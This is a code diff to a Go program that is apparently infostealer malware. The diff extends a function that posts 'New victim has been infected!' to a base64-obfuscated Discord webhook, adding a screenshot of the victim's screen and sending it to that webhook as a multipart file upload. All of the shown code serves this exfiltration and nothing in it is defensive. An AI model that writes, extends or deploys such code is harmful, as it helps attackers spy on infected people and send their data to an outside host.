@@ -1,9 +1,11 @@
 package main
 
 import (
+	"bytes"
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
+	"mime/multipart"
 	"net/http"
 	"os"
 	"strings"
@@ -23,6 +25,7 @@ type DiscordEmbed struct {
 	Footer      *DiscordEmbedFooter    `json:"footer,omitempty"`
 	Thumbnail   *DiscordEmbedThumbnail `json:"thumbnail,omitempty"`
 	URL         string                 `json:"url,omitempty"`
+	Image       *DiscordEmbedThumbnail `json:"image,omitempty"`
 }
 
 type DiscordEmbedField struct {
@@ -328,9 +331,26 @@ func SendDiscordNotification() error {
 		Content: "New victim has been infected!",
 		Embeds:  embeds,
 	}
-	payload, _ := json.Marshal(message)
+	screenshot := TakeScreenshot()
+
+	if len(screenshot) > 0 {
+		message.Embeds[0].Image = &DiscordEmbedThumbnail{URL: "attachment://screenshot.png"}
+	}
+
+	attachment := Attachment{Filename: "screenshot.png", Data: []byte{}}
+	if screenshot != nil {
+		attachment = Attachment{
+			Filename: "screenshot.png",
+			Data:     screenshot,
+		}
+	}
+	payload, contentType, err := buildPayload(message, []Attachment{attachment})
+	if err != nil {
+		return err
+	}
+
 	decoded, _ := base64.StdEncoding.DecodeString(discordWebhookUrl)
-	res, err := http.Post(string(decoded), "application/json", strings.NewReader(string(payload)))
+	res, err := http.Post(string(decoded), contentType, bytes.NewReader(payload))
 	if err != nil {
 		return err
 	}
@@ -339,4 +359,52 @@ func SendDiscordNotification() error {
 		return fmt.Errorf("failed to send Discord notification, status code: %d", res.StatusCode)
 	}
 	return nil
+}
+
+type Attachment struct {
+	Filename string
+	Data     []byte
+}
+
+func buildPayload(message DiscordMessage, attachments []Attachment) ([]byte, string, error) {
+	// Marshal the message to JSON
+	jsonData, err := json.Marshal(message)
+	if err != nil {
+		return nil, "", err
+	}
+
+	// Create the payload in multipart/form-data format
+	var body bytes.Buffer
+	writer := multipart.NewWriter(&body)
+	defer writer.Close()
+
+	// Add the JSON part
+	part, err := writer.CreateFormField("payload_json")
+	if err != nil {
+		return nil, "", err
+	}
+	_, err = part.Write(jsonData)
+	if err != nil {
+		return nil, "", err
+	}
+
+	// Add attachments if any
+	for i, attachment := range attachments {
+		part, err := writer.CreateFormFile(fmt.Sprintf("files[%d]", i), attachment.Filename)
+		if err != nil {
+			return nil, "", err
+		}
+		_, err = part.Write(attachment.Data)
+		if err != nil {
+			return nil, "", err
+		}
+	}
+
+	// Close the writer to finalize the form data
+	err = writer.Close()
+	if err != nil {
+		return nil, "", err
+	}
+
+	return body.Bytes(), writer.FormDataContentType(), nil
 }
